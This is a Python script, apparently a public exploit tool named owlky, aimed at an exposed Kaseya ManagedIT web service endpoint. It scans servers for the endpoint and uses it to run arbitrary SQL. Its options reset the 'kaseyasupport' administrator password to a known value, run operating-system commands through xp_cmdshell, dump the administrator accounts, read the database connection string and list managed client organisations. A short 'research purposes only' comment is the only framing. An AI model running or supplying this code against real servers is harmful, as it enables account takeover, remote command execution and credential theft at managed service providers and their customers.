#!/usr/bin/env python
#
#     Info:  github.com/kbni/owlky
#   Author:  alex@kbni.net.au
#
# Created for research purposes only. Don't be evil!

import sys
import requests
import base64
import gzip
import re
import uuid
import hashlib

BAD_URI = 'KaseyaCwWebService/ManagedIT.asmx'
IS_PYTHON3 = sys.version_info > (3, 0)

def ensure_string(pot_str):
    if IS_PYTHON3:
        if isinstance(pot_str, bytes):
            return pot_str.decode('utf-8')
        else:
            return pot_str
    else:
        return pot_str

def cover_pass(tmp, challenge):
    if IS_PYTHON3:
        return hashlib.sha1(bytes(tmp+challenge, 'utf-8')).hexdigest()
    else:
        return hashlib.sha1(tmp+challenge).hexdigest()

def cover_pass_256(tmp, challenge):
    if IS_PYTHON3:
        return hashlib.sha256(bytes(tmp+challenge, 'utf-8')).hexdigest()
    else:
        return hashlib.sha256(tmp+challenge).hexdigest()

def check_kaseya(hostname, verbose=None):
    for scheme in ('https', 'http'):
        try_url = '{}://{}/{}'.format(scheme, hostname, BAD_URI)
        try:
            res = requests.get(try_url, timeout=5)
        except Exception:
            continue

        if 'HTTP Error 404.0 - Not Found' in res.text:
            print('{}://{} probably never had Managed IT Sync'.format(scheme, hostname))
            return None

        if 'HTTP Error 404.503 - Not Found' in res.text:
            print('{}://{} is probably patched'.format(scheme, hostname))
            return None

        if 'ManagedIT.asmx?op=' in res.text:
            if verbose is True:
                print('{}://{} seems vulnerable'.format(scheme, hostname))
            return try_url

def get_kaseya_data(base_url, endpoint, post_data=None, verbose=None):
    endpoint_url = '{}/{}'.format(base_url, endpoint)
    res = requests.post(endpoint_url, data=post_data)

    if verbose:
        print('Data returned from endpoint:\n', res.text, '\n')

    if endpoint == 'GetAllMachineIDs':
        for d in re.findall('<Bytes>(.+?)</Bytes>', res.text):
            raw_data = gzip.decompress(base64.b64decode(d))
            return raw_data.decode('UTF-16LE')

    elif endpoint in ('GetDataSet', 'GetConnectionString'):
        return res.text

    else:
        return res.status_code == 200

if __name__ == "__main__":
    take_args = ['-v', '--verbose', '-h', '--help']
    check = sys.argv[-1] == 'check'
    verbose = '-v' in sys.argv or '--verbose' in sys.argv
    show_help = '-h' in sys.argv or '--verbose' in sys.argv
    try:
        servers = sys.argv[1].split(',')
    except:
        servers = []
        show_help = True
    args = [a for a in sys.argv[2:] if a not in take_args]

    for server_name in servers:
        sys.stdout.write('\nChecking host: {}..'.format(server_name))
        res_url = check_kaseya(server_name, verbose or check)
        if not res_url:
            print(". isn't vulnerable")
            continue
        else:
            print(". seems vulnerable!")

        for arg in args:
            print()
            if arg == 'reset-support':
                resetuser = 'kaseyasupport'
                resetpass = str(uuid.uuid4()).replace('-','')[-8:]
                covered = cover_pass_256(resetpass, resetuser)
                resetsql = "UPDATE administrators SET forceNewPassword=0,disableUntil='1980-01-01 00:00:00.000'," + \
                           "adminType=2,adminPassword='cover{}' WHERE adminName='{}'".format(covered, resetuser)

                print('Attempting to reset password for {} to {}'.format(resetuser, resetpass))
                reset = get_kaseya_data(res_url, 'ExecuteSQL', {'sql': resetsql})
                print('Successfully reset password.' if reset else 'Unable to reset password')

            elif arg == 'dir-c':
                data = get_kaseya_data(res_url, 'GetDataSet', {'sql': "EXEC xp_cmdshell 'dir C:\\'"})

                if '<output' in data:
                    print('Received output from {}:\n'.format(server_name))
                    for line in re.findall('<output>(.+?)</output>', ensure_string(data), re.MULTILINE|re.DOTALL):
                        print('\t' + line.replace('&lt;', '<').replace('&gt;', '>'))
                else:
                    print('No data received from {}'.format(server_name))

            elif arg == 'list-users':
                data = get_kaseya_data(res_url, 'GetDataSet', {'sql': 'SELECT * FROM administrators'}, verbose=verbose)
                found_users = []

                for user_xml in re.findall('<Table.+?>(.+?)</Table>', ensure_string(data), re.MULTILINE|re.DOTALL):
                    user_dict = {}
                    for line in user_xml.split('\n'):
                        line = (line.strip().split('</')[0][1:] + '>').split('>')
                        if len(line) < 2:
                            continue
                        key, val = line[:2]
                        user_dict[key] = val

                    if 'adminName' in user_dict:
                        found_users.append(user_dict)

                for fu in found_users:
                    print('Found user {} ({}) at {}'.format(fu['adminName'], fu.get('logonEmailAddr', 'no email'), server_name))
                if not found_users:
                    print('Found no users at {}'.format(server_name))

            elif arg == 'get-dsn':
                data = get_kaseya_data(res_url, 'GetConnectionString', verbose=verbose)
                print('The DSN for the Kaseya DB at {} is: {}'.format(server_name, data))

            elif arg == 'list-orgs':
                data = get_kaseya_data(res_url, 'GetAllMachineIDs', verbose=verbose)
                found_orgs = []
                if data:
                    found_orgs = list(set([mg.split('.')[-1] for mg in re.findall('<groupName>(.+?)</groupName>', data)]))
                    found_orgs.sort()
                for fo in found_orgs:
                    print('Found org [{}] at {}'.format(fo, server_name))
                if not found_orgs:
                    print('Found no orgs at {}'.format(server_name))

            else:
                print('Unknown argument: {}'.format(arg))
                sys.exit(1)

    if show_help or len(args) == 0:
        print()
        print('               available commands:')
        print('   )\___/(     owlky.py server(s) check')
        print('  {(K)v(Y)}    owlky.py server(s) dir-c')
        print('   {| ~ |}     owlky.py server(s) reset-support')
        print('   {/ ^ \}     owlky.py server(s) list-orgs')
        print('    `m-m`      owlky.py server(s) list-users')

    print()
    sys.exit(0)
